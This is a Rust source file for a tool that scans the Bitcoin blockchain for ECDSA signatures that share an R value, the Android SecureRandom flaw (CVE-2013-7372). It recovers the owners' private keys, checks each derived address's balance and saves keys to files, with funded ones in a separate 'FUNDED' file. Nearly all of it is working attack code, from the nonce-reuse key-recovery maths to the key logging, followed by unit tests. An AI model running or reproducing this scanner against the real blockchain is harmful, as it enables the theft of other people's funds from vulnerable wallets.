use anyhow::{anyhow, Result};
use bitcoin::secp256k1::{Secp256k1, SecretKey};
use bitcoincore_rpc::{Auth, Client, RpcApi};
use num_bigint::{BigInt, Sign};
use num_traits::{Num, One, Zero};
use std::collections::HashMap;
use std::fs::OpenOptions;
use std::io::Write;
use tracing::{error, info, warn};

/// Recover private key from two signatures with the same R value
/// Given: (r, s1, m1) and (r, s2, m2)
/// k = (m1 - m2) / (s1 - s2) mod n
/// private_key = (s1 * k - m1) / r mod n
#[allow(dead_code)]
fn recover_private_key(r: &[u8], s1: &[u8], s2: &[u8], m1: &[u8], m2: &[u8]) -> Result<Vec<u8>> {
    let n = BigInt::from_str_radix(
        "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141",
        16,
    )?;

    // Convert bytes to BigInt
    let r_int = BigInt::from_bytes_be(Sign::Plus, r);
    let s1_int = BigInt::from_bytes_be(Sign::Plus, s1);
    let s2_int = BigInt::from_bytes_be(Sign::Plus, s2);
    let m1_int = BigInt::from_bytes_be(Sign::Plus, m1);
    let m2_int = BigInt::from_bytes_be(Sign::Plus, m2);

    // Calculate k = (m1 - m2) / (s1 - s2) mod n
    let s_diff = (&s1_int - &s2_int + &n) % &n;
    let s_diff_inv = mod_inverse(&s_diff, &n)?;

    let m_diff = (&m1_int - &m2_int + &n) % &n;

    // k = (m1 - m2) * (s1 - s2)^-1 mod n
    let k = (&m_diff * &s_diff_inv) % &n;

    // Calculate private_key = (s1 * k - m1) / r mod n
    let numerator = (&s1_int * &k - &m1_int) % &n;
    let numerator = if numerator < BigInt::zero() {
        numerator + &n
    } else {
        numerator
    };

    let r_inv = mod_inverse(&r_int, &n)?;

    let d = (&numerator * &r_inv) % &n;

    // Convert to 32-byte array
    let (_, d_bytes) = d.to_bytes_be();

    // Pad to 32 bytes
    let mut priv_key = vec![0u8; 32];
    let len = d_bytes.len();
    if len > 32 {
        return Err(anyhow::anyhow!("Private key too large"));
    }
    priv_key[32 - len..].copy_from_slice(&d_bytes);

    Ok(priv_key)
}

// Type alias to simplify complex signature data structure
type SignatureData = (String, Vec<u8>, Vec<u8>, Vec<u8>); // (txid, signature, message_hash, public_key)
type RValueMap = HashMap<Vec<u8>, Vec<SignatureData>>;

// secp256k1 curve order (n)
const SECP256K1_N: &str =
    "115792089237316195423570985008687907852837564279074904382605163141518161494337";

/// Extract r and s values from DER-encoded ECDSA signature
fn extract_signature_components(der_sig: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> {
    if der_sig.len() < 8 || der_sig[0] != 0x30 {
        return Err(anyhow!("Invalid DER signature format"));
    }

    let sig_len = der_sig[1] as usize;
    if der_sig.len() < 2 + sig_len {
        return Err(anyhow!("Invalid DER signature length"));
    }

    // Parse r value
    if der_sig[2] != 0x02 {
        return Err(anyhow!("Invalid r value marker"));
    }
    let r_len = der_sig[3] as usize;
    if der_sig.len() < 4 + r_len {
        return Err(anyhow!("Invalid r value length"));
    }
    let r_value = der_sig[4..4 + r_len].to_vec();

    // Parse s value
    let s_offset = 4 + r_len;
    if der_sig.len() < s_offset + 2 || der_sig[s_offset] != 0x02 {
        return Err(anyhow!("Invalid s value marker"));
    }
    let s_len = der_sig[s_offset + 1] as usize;
    if der_sig.len() < s_offset + 2 + s_len {
        return Err(anyhow!("Invalid s value length"));
    }
    let s_value = der_sig[s_offset + 2..s_offset + 2 + s_len].to_vec();

    Ok((r_value, s_value))
}

/// Convert bytes to BigInt (big-endian)
fn bytes_to_bigint(bytes: &[u8]) -> BigInt {
    BigInt::from_bytes_be(num_bigint::Sign::Plus, bytes)
}

/// Convert BigInt to 32-byte array (big-endian), returns None if value is too large or negative
fn bigint_to_32bytes(value: &BigInt) -> Option<[u8; 32]> {
    if value < &BigInt::zero() {
        return None;
    }

    let (sign, bytes) = value.to_bytes_be();
    if sign == num_bigint::Sign::Minus || bytes.len() > 32 {
        return None;
    }

    let mut result = [0u8; 32];
    let offset = 32 - bytes.len();
    result[offset..].copy_from_slice(&bytes);
    Some(result)
}

/// Compute modular multiplicative inverse using Extended Euclidean Algorithm
fn mod_inverse(a: &BigInt, modulus: &BigInt) -> Result<BigInt> {
    let mut t = BigInt::zero();
    let mut newt = BigInt::one();
    let mut r = modulus.clone();
    let mut newr = a.clone();

    while !newr.is_zero() {
        let quotient = &r / &newr;

        let temp_t = t.clone();
        t = newt.clone();
        newt = temp_t - &quotient * &newt;

        let temp_r = r.clone();
        r = newr.clone();
        newr = temp_r - quotient * newr;
    }

    if r > BigInt::one() {
        return Err(anyhow!("Value is not invertible"));
    }

    if t < BigInt::zero() {
        t += modulus;
    }

    Ok(t)
}

/// Extract public key from scriptSig (for P2PKH transactions)
fn extract_pubkey_from_script(script_bytes: &[u8]) -> Option<Vec<u8>> {
    // P2PKH scriptSig format: <signature> <pubkey>
    // Public key is typically 33 bytes (compressed) or 65 bytes (uncompressed)
    // and starts with 0x02, 0x03 (compressed) or 0x04 (uncompressed)

    for i in 0..script_bytes.len() {
        if i + 33 <= script_bytes.len() && (script_bytes[i] == 0x02 || script_bytes[i] == 0x03) {
            // Possibly a compressed public key
            return Some(script_bytes[i..i + 33].to_vec());
        } else if i + 65 <= script_bytes.len() && script_bytes[i] == 0x04 {
            // Possibly an uncompressed public key
            return Some(script_bytes[i..i + 65].to_vec());
        }
    }
    None
}

/// Compute sighash for a transaction input
/// This requires fetching the previous transaction to get the scriptPubKey
fn compute_sighash(
    rpc: &Client,
    tx: &bitcoin::Transaction,
    input_index: usize,
    sighash_type: u32,
) -> Result<Vec<u8>> {
    use bitcoin::consensus::encode::serialize;
    use bitcoin::hashes::{sha256d, Hash};

    if input_index >= tx.input.len() {
        return Err(anyhow!("Input index out of bounds"));
    }

    let input = &tx.input[input_index];
    let prev_txid = input.previous_output.txid;
    let prev_vout = input.previous_output.vout;

    // Fetch the previous transaction to get the scriptPubKey
    let prev_tx = rpc
        .get_raw_transaction(&prev_txid, None)
        .map_err(|e| anyhow!("Failed to fetch previous transaction: {}", e))?;

    if prev_vout as usize >= prev_tx.output.len() {
        return Err(anyhow!("Previous output index out of bounds"));
    }

    let script_pubkey = &prev_tx.output[prev_vout as usize].script_pubkey;

    // Create a modified transaction for sighash computation
    let mut tx_copy = tx.clone();

    // Clear all input scripts
    for input in &mut tx_copy.input {
        input.script_sig = bitcoin::ScriptBuf::new();
    }

    // Set the script for the input being signed
    tx_copy.input[input_index].script_sig = script_pubkey.clone();

    // Serialize transaction with sighash type
    let mut sighash_data = serialize(&tx_copy);
    sighash_data.extend_from_slice(&sighash_type.to_le_bytes());

    // Double SHA256
    let hash = sha256d::Hash::hash(&sighash_data);
    Ok(hash.to_byte_array().to_vec())
}

/// Attempt to recover private key from duplicate R signatures
fn attempt_key_recovery(
    r_value: &[u8],
    sig1_der: &[u8],
    sig2_der: &[u8],
    msg_hash1: &[u8],
    msg_hash2: &[u8],
) -> Result<SecretKey> {
    // Check if we have both message hashes
    if msg_hash1.is_empty() || msg_hash2.is_empty() {
        return Err(anyhow!("Missing message hash data"));
    }

    // Extract signature components
    let (r1, s1) = extract_signature_components(sig1_der)?;
    let (r2, s2) = extract_signature_components(sig2_der)?;

    // Verify that both signatures use the same R value
    if r1 != r2 || r1 != r_value {
        return Err(anyhow!("R values do not match"));
    }

    // Attempt recovery
    recover_private_key_from_duplicate_r(&r1, &s1, &s2, msg_hash1, msg_hash2)
}

/// Recover private key from two signatures with the same nonce (k)
/// Formula: k = (m1 - m2) / (s1 - s2) mod n
///          private_key = (s1 * k - m1) / r mod n
fn recover_private_key_from_duplicate_r(
    r: &[u8],
    s1: &[u8],
    s2: &[u8],
    m1: &[u8],
    m2: &[u8],
) -> Result<SecretKey> {
    let n = BigInt::parse_bytes(SECP256K1_N.as_bytes(), 10)
        .ok_or_else(|| anyhow!("Failed to parse curve order"))?;

    // Convert to BigInt
    let r_int = bytes_to_bigint(r);
    let s1_int = bytes_to_bigint(s1);
    let s2_int = bytes_to_bigint(s2);
    let m1_int = bytes_to_bigint(m1);
    let m2_int = bytes_to_bigint(m2);

    // Calculate k = (m1 - m2) / (s1 - s2) mod n
    // Handle negative results properly by adding n before final modulo
    let m_diff = ((&m1_int - &m2_int) % &n + &n) % &n;
    let s_diff = ((&s1_int - &s2_int) % &n + &n) % &n;

    // Check if s1 == s2 (would cause division by zero)
    if s_diff.is_zero() {
        return Err(anyhow!("s1 and s2 are equal, cannot recover nonce"));
    }

    let s_diff_inv = mod_inverse(&s_diff, &n)?;
    let k = (&m_diff * &s_diff_inv) % &n;

    // Calculate private_key = (s1 * k - m1) / r mod n
    let sk_product = (&s1_int * &k) % &n;
    let numerator = ((&sk_product - &m1_int) % &n + &n) % &n;
    let r_inv = mod_inverse(&r_int, &n)?;
    let private_key_int = (&numerator * &r_inv) % &n;

    // Convert to 32-byte secret key
    let sk_bytes =
        bigint_to_32bytes(&private_key_int).ok_or_else(|| anyhow!("Private key out of range"))?;

    SecretKey::from_slice(&sk_bytes).map_err(|e| anyhow!("Failed to create secret key: {}", e))
}

/// Scanner for Android SecureRandom vulnerability (CVE-2013-7372)
/// Finds transactions with duplicate R values and derives private keys
pub fn run(
    rpc_url: &str,
    rpc_user: &str,
    rpc_pass: &str,
    start_block: u64,
    end_block: u64,
) -> Result<()> {
    info!("Android SecureRandom Vulnerability Scanner");
    info!(
        "Scanning blocks {} to {} for duplicate R values...",
        start_block, end_block
    );
    info!("Connecting to Bitcoin Core at {}...", rpc_url);

    let rpc = Client::new(
        rpc_url,
        Auth::UserPass(rpc_user.to_string(), rpc_pass.to_string()),
    )?;

    // Test connection
    let blockchain_info = rpc.get_blockchain_info()?;
    info!("Connected! Current block: {}", blockchain_info.blocks);

    if blockchain_info.blocks < end_block {
        warn!(
            "Requested end block {} but node only synced to {}",
            end_block, blockchain_info.blocks
        );
        warn!("Will scan up to block {}", blockchain_info.blocks);
    }

    // Map of R value -> (txid, signature, message hash, public key)
    let mut r_values: RValueMap = HashMap::new();
    let mut transactions_scanned = 0;
    let mut signatures_extracted = 0;
    let mut duplicates_found = 0;

    let start_time = std::time::Instant::now();

    // Scan blocks
    for block_height in start_block..=end_block.min(blockchain_info.blocks) {
        if block_height % 100 == 0 {
            let elapsed = start_time.elapsed().as_secs_f64();
            let rate = (block_height - start_block) as f64 / elapsed;
            info!("Scanning block {}/{} - Rate: {:.1} blocks/sec - Txs: {} - Sigs: {} - Duplicates: {}", 
                block_height, end_block, rate, transactions_scanned, signatures_extracted, duplicates_found);
        }

        // Get block hash
        let block_hash = match rpc.get_block_hash(block_height) {
            Ok(hash) => hash,
            Err(e) => {
                error!("Error getting block hash for {}: {}", block_height, e);
                continue;
            }
        };

        // Get block
        let block = match rpc.get_block(&block_hash) {
            Ok(block) => block,
            Err(e) => {
                error!("Error getting block {}: {}", block_height, e);
                continue;
            }
        };

        // Process transactions
        for tx in &block.txdata {
            transactions_scanned += 1;

            // Extract signatures from inputs
            for (input_index, input) in tx.input.iter().enumerate() {
                // Try to extract DER signature from scriptSig
                let script_bytes = input.script_sig.as_bytes();

                // Look for DER signature pattern (0x30 followed by length)
                for i in 0..script_bytes.len() {
                    if script_bytes[i] == 0x30 && i + 1 < script_bytes.len() {
                        let sig_len = script_bytes[i + 1] as usize;
                        if i + 2 + sig_len <= script_bytes.len() {
                            let sig_bytes = &script_bytes[i..i + 2 + sig_len];

                            // Extract R value (first 32 bytes after header)
                            // DER format: 0x30 [total-len] 0x02 [r-len] [r-bytes] 0x02 [s-len] [s-bytes]
                            if sig_bytes.len() > 6 && sig_bytes[2] == 0x02 {
                                let r_len = sig_bytes[3] as usize;
                                if sig_bytes.len() > 4 + r_len {
                                    let r_value = sig_bytes[4..4 + r_len].to_vec();

                                    signatures_extracted += 1;

                                    // Try to extract public key from scriptSig
                                    let pubkey = extract_pubkey_from_script(script_bytes)
                                        .unwrap_or_default();

                                    // Store signature info
                                    let txid = tx.compute_txid().to_string();

                                    // Try to compute sighash (may fail if previous tx not available)
                                    // Extract sighash type from signature (last byte after DER encoding)
                                    let sighash_type = if i + 2 + sig_len < script_bytes.len() {
                                        script_bytes[i + 2 + sig_len] as u32
                                    } else {
                                        1 // SIGHASH_ALL default
                                    };

                                    let message_hash =
                                        compute_sighash(&rpc, tx, input_index, sighash_type)
                                            .unwrap_or_default();

                                    let entry = r_values.entry(r_value.clone()).or_default();

                                    // If this is a duplicate R value, we found a vulnerability!
                                    if !entry.is_empty() {
                                        duplicates_found += 1;
                                        warn!("🎯 DUPLICATE R VALUE FOUND!");
                                        warn!("R value: {}", hex::encode(&r_value));
                                        warn!("First seen in: {}", entry[0].0);
                                        warn!("Also seen in: {}", txid);
                                        warn!("Block: {}", block_height);

                                        // Attempt private key recovery
                                        match attempt_key_recovery(
                                            &r_value,
                                            &entry[0].1,
                                            sig_bytes,
                                            &entry[0].2,
                                            &message_hash,
                                        ) {
                                            Ok(private_key) => {
                                                warn!("✅ PRIVATE KEY RECOVERED!");
                                                warn!(
                                                    "Private Key (hex): {}",
                                                    hex::encode(private_key.secret_bytes())
                                                );

                                                // Verify the recovered key by deriving the public key
                                                let secp = Secp256k1::new();
                                                let public_key =
                                                    bitcoin::secp256k1::PublicKey::from_secret_key(
                                                        &secp,
                                                        &private_key,
                                                    );
                                                warn!(
                                                    "Derived Public Key: {}",
                                                    hex::encode(public_key.serialize())
                                                );

                                                // Derive Bitcoin address from public key
                                                use bitcoin::{Address, Network};
                                                let compressed_pubkey =
                                                    bitcoin::CompressedPublicKey(public_key);
                                                let address = Address::p2pkh(
                                                    compressed_pubkey,
                                                    Network::Bitcoin,
                                                );
                                                warn!("Derived Address: {}", address);

                                                // Check balance via RPC
                                                let balance_result =
                                                    rpc.get_received_by_address(&address, Some(0));
                                                let balance = match balance_result {
                                                    Ok(amount) => {
                                                        let btc_amount = amount.to_btc();
                                                        warn!("💰 Balance: {} BTC", btc_amount);
                                                        btc_amount
                                                    }
                                                    Err(e) => {
                                                        warn!("⚠️  Failed to check balance: {}", e);
                                                        0.0
                                                    }
                                                };

                                                // Write recovery results to file (append mode)
                                                let recovery_data = format!(
                                                    "PRIVATE KEY RECOVERED!\n\
                                                     R value: {}\n\
                                                     Tx1: {}\n\
                                                     Tx2: {}\n\
                                                     Block: {}\n\
                                                     Private Key: {}\n\
                                                     Public Key: {}\n\
                                                     Address: {}\n\
                                                     Balance: {} BTC\n\n",
                                                    hex::encode(&r_value),
                                                    entry[0].0,
                                                    txid,
                                                    block_height,
                                                    hex::encode(private_key.secret_bytes()),
                                                    hex::encode(public_key.serialize()),
                                                    address,
                                                    balance
                                                );

                                                let filename = if balance > 0.0 {
                                                    "android_securerandom_FUNDED_keys.txt"
                                                } else {
                                                    "android_securerandom_recovered_keys.txt"
                                                };

                                                let mut file = OpenOptions::new()
                                                    .create(true)
                                                    .append(true)
                                                    .open(filename)?;
                                                file.write_all(recovery_data.as_bytes())?;

                                                if balance > 0.0 {
                                                    warn!("🎯 FUNDED ADDRESS FOUND! Saved to android_securerandom_FUNDED_keys.txt");
                                                }
                                            }
                                            Err(e) => {
                                                warn!("⚠️  Failed to recover private key: {}", e);
                                                warn!("This may be due to missing sighash data or other issues.");

                                                // Still write the duplicate finding to file (append mode)
                                                let error_data = format!(
                                                    "Duplicate R value found!\n\
                                                     R: {}\n\
                                                     Tx1: {}\n\
                                                     Tx2: {}\n\
                                                     Block: {}\n\
                                                     Recovery Error: {}\n\n",
                                                    hex::encode(&r_value),
                                                    entry[0].0,
                                                    txid,
                                                    block_height,
                                                    e
                                                );

                                                let mut file = OpenOptions::new()
                                                    .create(true)
                                                    .append(true)
                                                    .open("android_securerandom_hits.txt")?;
                                                file.write_all(error_data.as_bytes())?;
                                            }
                                        }
                                    }

                                    entry.push((txid, sig_bytes.to_vec(), message_hash, pubkey));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    info!("Scan complete!");
    info!("Blocks scanned: {} to {}", start_block, end_block);
    info!("Transactions scanned: {}", transactions_scanned);
    info!("Signatures extracted: {}", signatures_extracted);
    info!("Duplicate R values found: {}", duplicates_found);

    if duplicates_found > 0 {
        warn!("Found {} vulnerable transactions!", duplicates_found);
        warn!("Private key recovery attempts have been made.");
        warn!("Successfully recovered keys are written to android_securerandom_recovered_keys.txt");
        warn!("Failed recovery attempts are written to android_securerandom_hits.txt");
        warn!("Note: Recovery requires access to transaction sighash data.");
        warn!("If the previous transaction is not available, recovery will fail.");
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_signature_components() {
        // Example DER signature (simplified)
        // 0x30 [total-len] 0x02 [r-len] [r-bytes] 0x02 [s-len] [s-bytes]
        let der_sig = vec![
            0x30, 0x44, // DER header, total length 68
            0x02, 0x20, // r marker and length (32 bytes)
            // 32 bytes of r value
            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e,
            0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c,
            0x1d, 0x1e, 0x1f, 0x20, 0x02, 0x20, // s marker and length (32 bytes)
            // 32 bytes of s value
            0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e,
            0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c,
            0x3d, 0x3e, 0x3f, 0x40,
        ];

        let result = extract_signature_components(&der_sig);
        assert!(result.is_ok());

        let (r, s) = result.unwrap();
        assert_eq!(r.len(), 32);
        assert_eq!(s.len(), 32);
        assert_eq!(r[0], 0x01);
        assert_eq!(s[0], 0x21);
    }

    #[test]
    fn test_bytes_to_bigint() {
        let bytes = vec![0x01, 0x02, 0x03];
        let big = bytes_to_bigint(&bytes);
        // 0x010203 = 66051 in decimal
        assert_eq!(big, BigInt::from(66051u32));
    }

    #[test]
    fn test_bigint_to_32bytes() {
        let big = BigInt::from(12345u32);
        let result = bigint_to_32bytes(&big);
        assert!(result.is_some());

        let bytes = result.unwrap();
        assert_eq!(bytes.len(), 32);
        // Should be padded with zeros and have 12345 at the end
        assert_eq!(bytes[31], 0x39); // 12345 & 0xFF = 57 = 0x39
        assert_eq!(bytes[30], 0x30); // (12345 >> 8) & 0xFF = 48 = 0x30
    }

    #[test]
    fn test_mod_inverse() {
        // Test modular inverse: (3 * inv(3)) mod 7 = 1
        let a = BigInt::from(3);
        let m = BigInt::from(7);
        let result = mod_inverse(&a, &m);
        assert!(result.is_ok());

        let inv = result.unwrap();
        let product = (&a * &inv) % &m;
        assert_eq!(product, BigInt::one());
    }

    #[test]
    fn test_recover_private_key_with_known_values() {
        // This is a simplified test with small values
        // In reality, these would be 256-bit values from secp256k1

        // For this test, we'll verify the mathematical relationship
        // k = (m1 - m2) / (s1 - s2) mod n
        // private_key = (s * k - m) / r mod n

        // We can't easily test with real ECDSA values without a full test vector,
        // but we can verify the function compiles and handles basic cases

        let r = vec![0x01; 32];
        let s1 = vec![0x02; 32];
        let s2 = vec![0x03; 32];
        let m1 = vec![0x04; 32];
        let m2 = vec![0x05; 32];

        // This will likely produce an invalid key (which is expected for random test data)
        // but it tests that the function doesn't panic
        let result = recover_private_key_from_duplicate_r(&r, &s1, &s2, &m1, &m2);

        // The function should complete without panicking
        // It might fail to create a valid SecretKey, which is fine for this test data
        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn test_extract_pubkey_from_script() {
        // Test with compressed public key (33 bytes starting with 0x02)
        let mut script = vec![0x00; 10];
        script.push(0x02); // Compressed pubkey marker
        script.extend_from_slice(&[0xFF; 32]); // 32 more bytes
        script.extend_from_slice(&[0x00; 10]); // Some trailing data

        let result = extract_pubkey_from_script(&script);
        assert!(result.is_some());
        let pubkey = result.unwrap();
        assert_eq!(pubkey.len(), 33);
        assert_eq!(pubkey[0], 0x02);
    }
}
